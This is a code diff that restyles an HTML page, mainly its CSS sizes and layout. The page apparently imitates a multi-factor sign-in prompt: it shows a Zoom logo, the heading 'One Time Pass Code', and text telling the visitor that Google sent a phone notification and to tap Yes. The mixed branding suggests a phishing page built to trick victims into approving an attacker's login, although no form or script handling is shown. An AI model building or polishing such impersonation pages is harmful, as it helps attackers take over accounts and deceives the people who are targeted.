@@ -15,67 +15,67 @@
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
     }
 
-    body {
+    html, body {
+      width: 100%;
+      min-height: 100vh;
       background-color: #ffffff;
       color: #202124;
       display: flex;
-      flex-direction: column;
+      justify-content: center;
       align-items: center;
-      justify-content: flex-start;
-      min-height: 100vh;
-      padding: 10px 20px;
     }
 
     .container {
       width: 100%;
-      max-width: 400px;
+      max-width: 360px;
       display: flex;
       flex-direction: column;
       align-items: center;
       text-align: center;
-      padding: 5px;
+      padding: 20px 16px;
+      background: #ffffff;
     }
 
     /* Top Logo */
     .logo {
-      width: 65px;
-      height: 65px;
+      width: 55px;
+      height: 55px;
       object-fit: contain;
-      margin-bottom: 6px;
+      margin-bottom: 8px;
       border-radius: 50%;
     }
 
     /* Main Title */
     h1 {
-      font-size: 22px;
+      font-size: 20px;
       font-weight: 700;
       color: #1a1a1a;
       margin-bottom: 10px;
     }
 
-    /* Phone Graphic Illustration (Ekhon aro onek boro kora holo) */
+    /* Phone Graphic Illustration */
     .phone-illustration {
-      width: 300px; 
+      width: 160px; 
       height: auto;
       object-fit: contain;
-      margin-bottom: 12px;
+      margin-bottom: 10px;
     }
 
     /* Sub Heading */
     h2 {
-      font-size: 20px;
+      font-size: 18px;
       font-weight: 700;
       color: #1a1a1a;
-      margin-bottom: 8px;
+      margin-bottom: 6px;
     }
 
     /* Description Text */
     .desc-text {
-      font-size: 16px;
+      font-size: 14.5px;
       font-weight: 600;
       color: #1f2937;
       line-height: 1.5;
-      margin-bottom: 30px;
+      margin-bottom: 20px;
     }
 
     .desc-text span {
@@ -87,17 +87,16 @@
     .btn-join {
       background-color: #007aff;
       color: white;
-      padding: 14px 0;
-      width: 85%;
-      max-width: 300px;
-      font-size: 16px;
+      padding: 13px 0;
+      width: 90%;
+      max-width: 280px;
+      font-size: 15px;
       font-weight: bold;
       border: none;
       border-radius: 10px;
       cursor: pointer;
       box-shadow: 0 4px 12px rgba(0, 122, 255, 0.2);
       transition: background-color 0.2s, transform 0.1s;
-      margin-top: auto;
     }
 
     .btn-join:hover {
@@ -107,39 +106,15 @@
     .btn-join:active {
       transform: scale(0.98);
     }
-
-    /* Mobile Responsive Adjustments */
-    @media (max-width: 360px) {
-      .container {
-        max-width: 100%;
-      }
-      .logo {
-        width: 55px;
-        height: 55px;
-      }
-      .phone-illustration {
-        width: 250px;
-      }
-      h1 {
-        font-size: 20px;
-      }
-      .desc-text {
-        font-size: 15px;
-      }
-    }
   </style>
 </head>
 <body>
 
   <div class="container">
     <img class="logo" src="../../Zoom-Logo.png" alt="Logo">
-
     <h1>One Time Pass Code</h1>
-
     <img class="phone-illustration" src="../icon.gif" alt="Phone Illustration">
-
     <h2>Check your phone.</h2>
-
     <p class="desc-text">
       Google sent a notification to your phone.<br>
       <span>Tap Yes</span> on the notification<br>
